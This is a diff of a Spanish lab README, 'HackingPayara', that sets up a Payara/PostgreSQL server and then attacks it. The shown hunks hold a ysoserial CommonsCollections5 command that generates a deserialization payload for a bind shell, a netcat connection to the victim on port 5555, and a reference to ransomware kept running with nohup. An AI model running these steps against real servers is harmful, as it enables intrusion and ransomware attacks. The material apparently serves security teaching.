@@ -19,10 +19,10 @@ Primero, clona el repositorio que contiene los archivos necesarios para la confi
 ### 1.2. Configuración de la Base de Datos `ecommerce`
 
 1.  **Mover el script SQL a `/tmp/`:**
-    El archivo `scriptDB.sql` se encuentra dentro del repositorio clonado en `HackingPayara/config_ubuntu/scriptDB.sql`. Muévelo al directorio `/tmp/`:
+    El archivo `scriptDB.sql` se encuentra dentro del repositorio clonado en `HackingPayara/db/scriptDB.sql`. Muévelo al directorio `/tmp/`:
 
     ```bash
-    mv HackingPayara/config_ubuntu/scriptDB.sql /tmp/
+    mv HackingPayara/db/scriptDB.sql /tmp/
     ```
 
 2.  **Ejecutar el script SQL como usuario `postgres`:**
@@ -30,47 +30,57 @@ Primero, clona el repositorio que contiene los archivos necesarios para la confi
 
     Abre una terminal y sigue estos pasos:
 
-    a.  **Accede como el usuario `postgres`:**
-        ```bash
-        sudo -i -u postgres
-        ```
-        Se te pedirá la contraseña de tu usuario `ubuntu` o el usuario con privilegios `sudo`.
+    **a. Accede como el usuario `postgres`:**
+    ```bash
+    sudo -i -u postgres
+    ```
+    Se te pedirá la contraseña de tu usuario `ubuntu` o el usuario con privilegios `sudo`
 
-    b.  **Ejecuta el script SQL:**
-        Una vez que estés en el prompt de `postgres` verás `postgres@Ubuntu:~$`, ejecuta el script:
-        ```bash
-        psql -f /tmp/scriptDB.sql
-        ```
-        Este comando ejecutará el contenido de `scriptDB.sql`. Verás mensajes indicando la creación de la base de datos, las tablas y la inserción de datos, similar a la siguiente salida:
+    **b. Ejecuta el script SQL:**
+    Una vez que estés en el prompt de `postgres` verás `postgres@Ubuntu:~$`, ejecuta el script:
+    ```bash
+    psql -f /tmp/scriptDB.sql
+    ```
+    Este comando ejecutará el contenido de `scriptDB.sql`. Verás mensajes indicando la creación de la base de datos, las tablas y la inserción de datos, similar a la siguiente salida:
 
-        ```
-        DROP DATABASE
-        CREATE DATABASE
-        You are now connected to database "ecommerce_db" as user "postgres".
-        DO
-        GRANT
-        CREATE TABLE
-        ...
-        ```
+    ```
+    DROP DATABASE
+    CREATE DATABASE
+    You are now connected to database "ecommerce_db" as user "postgres".
+    DO
+    GRANT
+    CREATE TABLE
+    ...
+    ```
 
 ### 1.3. Configuración del Servidor de Aplicaciones Payara
 
 1.  **Descargar Payara 5:**
     Descarga el servidor Payara desde el siguiente enlace:
     ```bash
-    git clone https://github.com/payara/Payara/releases/download/payara-server-5.2020.2/payara-5.2020.2.zip
+    wget https://github.com/payara/Payara/releases/download/payara-server-5.2020.2/payara-5.2020.2.zip
     ```
     Una vez descargado, descomprímelo en un lugar accesible, por ejemplo, en `/opt/`.
 
-2.  **Correr Payara como root:**
+2.  **Descargar el Driver JDBC de PostgreSQL:**
+    Descarga el driver JDBC para PostgreSQL. Puedes usar `wget` o `curl`:
+    ```bash
+    wget https://jdbc.postgresql.org/download/postgresql-42.7.7.jar
+    ```
+    Luego, mueve el archivo JAR descargado a la carpeta `lib` del dominio de Payara. Por ejemplo:
+    ```bash
+    sudo mv postgresql-42.7.7.jar /opt/payara5/glassfish/domains/domain1/lib/
+    ```
+
+3.  **Correr Payara como root:**
     Asegúrate de iniciar el servidor Payara con privilegios de root para evitar problemas de permisos. Por ejemplo, si Payara está en `/opt/payara5/bin`:
     ```bash
     sudo /opt/payara5/bin/asadmin start-domain
     ```
     *Ajusta la ruta a tu instalación de Payara según sea necesario.*
-3.  **Acceder a la consola de administración de Payara:**
+4.  **Acceder a la consola de administración de Payara:**
     Abre tu navegador web y navega a `http://localhost:4848`.
-4.  **Crear un JDBC Connection Pool:**
+5.  **Crear un JDBC Connection Pool:**
     * En la consola de administración, navega a **Resources** -> **JDBC** -> **JDBC Connection Pools**.
     * Haz clic en **New...**
     * **Pool Name:** `ecommercePool` o el nombre que prefieras.
@@ -82,15 +92,22 @@ Primero, clona el repositorio que contiene los archivos necesarios para la confi
     * **URL:** `jdbc:postgresql://localhost:5432/ecommerce_db`
     * **Password:** `postgres`
     * Haz clic en **Finish**.
-5.  **Verificar la conexión (Ping):**
+6.  **Verificar la conexión (Ping):**
     Después de crear el pool, selecciónalo y haz clic en el botón **Ping** para asegurar que la conexión a la base de datos sea exitosa.
-6.  **Crear un JDBC Resource:**
+7.  **Crear un JDBC Resource:**
     * Navega a **Resources** -> **JDBC** -> **JDBC Resources**.
     * Haz clic en **New...**
-    * **JNDI Name:** `jdbc/ecommerceDB` ¡Debe llamarse `ecommerceDB`!
+    * **JNDI Name:** `jdbc/ecommerceDB` ¡Debe llamarse `jdbc/ecommerceDB`!
     * **Pool Name:** Selecciona el pool que acabas de crear ej., `ecommercePool`.
     * Haz clic en **OK`.
-7.  **Desplegar la aplicación `.war`:**
+8.  **Reiniciar el Dominio de Payara:**
+    Después de configurar el JDBC Resource, es **crucial reiniciar el dominio** para que los cambios tomen efecto y la aplicación pueda usar el nuevo recurso.
+    ```bash
+    sudo /opt/payara5/bin/asadmin restart-domain
+    ```
+    *Ajusta la ruta a tu instalación de Payara según sea necesario.*
+
+9.  **Desplegar la aplicación `.war`:**
     * Navega a **Applications**.
     * Haz clic en **Deploy...**.
     * Selecciona el archivo `.war` que se encuentra en la carpeta `config_ubuntu` del repositorio `HackingPayara` que clonaste ej. `HackingPayara/config_ubuntu/tu-aplicacion.war`.
@@ -111,30 +128,33 @@ Para generar el payload necesario, sigue estos pasos:
     ```bash
     wget -O ~/Desktop/yoserial.jar https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar
     ```
-3.  **Verifica la versión de Java:**
+    
+    **(Esto instalará el archivo en el escritorio del usuario kali, es decir el visual y le cambiará el nombre a yoserial.jar)**
+
+4.  **Verifica la versión de Java:**
     Asegúrate de que tu versión de Java sea **1.8**. Si no, el siguiente paso te guiará para instalar y configurar Corretto 8.
     ```bash
     java -version
     ```
-4.  **Descarga Amazon Corretto 8 (si es necesario):**
+5.  **Descarga Amazon Corretto 8 (si es necesario):**
     ```bash
     wget https://corretto.aws/downloads/latest/amazon-corretto-8-x64-linux-jdk.deb
     ```
-5.  **Instala Amazon Corretto 8:**
+6.  **Instala Amazon Corretto 8:**
     ```bash
     sudo dpkg -i amazon-corretto-8-x64-linux-jdk.deb
     ```
-6.  **Configura Java para usar Corretto 8:**
+7.  **Configura Java para usar Corretto 8:**
     ```bash
     sudo update-alternatives --config java
     ```
     *Selecciona la opción que corresponda a Java 1.8 de Corretto.*
-7.  **Crea el payload con `ysoserial`:**
+8.  **Crea el payload con `ysoserial`:**
     Asegúrate de estar en el directorio `~/Desktop`. La salida de este comando será tu payload codificado en Base64; **guárdalo, lo necesitarás más adelante.**
     ```bash
     java -jar ysoserial.jar CommonsCollections5 "$BIND_SHELL_COMMAND" | base64 -w 0
     ```
-8.  **Restaura la versión original de Java:**
+9.  **Restaura la versión original de Java:**
     Una vez que hayas generado el payload, es recomendable volver a la versión de Java que tenías antes (por ejemplo, Java 21, común en las últimas distribuciones de GNU/Linux).
     ```bash
     sudo update-alternatives --config java
@@ -708,7 +728,7 @@ Una vez que hayas establecido una `bind shell` en la máquina Ubuntu víctima us
     ---
     **Importante: Reconexión de la Bind Shell**
 
-    Puede que la `bind shell` que obtienes sea inestable o se "buguee" al verficar donde se encuentra la base de datos, causando que la conexión se pierda. Si esto sucede, o si te desconectas intencionalmente, es **necesario volver a enviar el payload** a la aplicación     vulnerable y **volver a conectarte con Netcat** `nc <IP_UBUNTU> 5555` para recuperar el acceso a la máquina víctima.
+    Puede que la `bind shell` que obtienes sea inestable o se "buguee", causando que la conexión se pierda. Si esto sucede, o si te desconectas intencionalmente, es **necesario volver a enviar el payload** a la aplicación vulnerable y **volver a conectarte con Netcat** `nc <IP_UBUNTU> 5555` para recuperar el acceso a la máquina víctima.
 
     El ransomware, gracias a `nohup`, debería seguir ejecutándose en segundo plano en la máquina víctima, pero necesitarás una nueva shell para interactuar con el sistema o verificar su estado.
 
@@ -741,5 +761,5 @@ Limpia los artefactos de compilación para futuras ejecuciones:
 1.  **Borra todos los artefactos de compilación:**
     Puedes descomentar y ejecutar esta línea en tu máquina Kali para limpiar los archivos generados y dejar tu directorio de trabajo listo para una nueva ejecución.
     ```bash
-    # rm -rf pyarmor_output/ dist/ build/ *.spec
+    rm -rf pyarmor_output/ dist/ build/ *.spec
     ```
